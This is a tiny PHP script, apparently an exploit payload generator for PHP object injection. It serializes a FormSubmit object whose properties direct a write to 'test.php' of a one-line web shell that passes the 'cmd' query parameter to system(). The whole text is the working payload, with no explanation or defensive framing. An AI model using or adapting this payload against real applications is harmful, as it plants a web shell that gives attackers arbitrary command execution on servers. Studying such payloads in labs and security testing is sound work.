<?php
class FormSubmit
{
   public $form_file = 'test.php';
   public $message = '<?php system($_GET["cmd"]); ?>';
}
print serialize(new FormSubmit);

?>
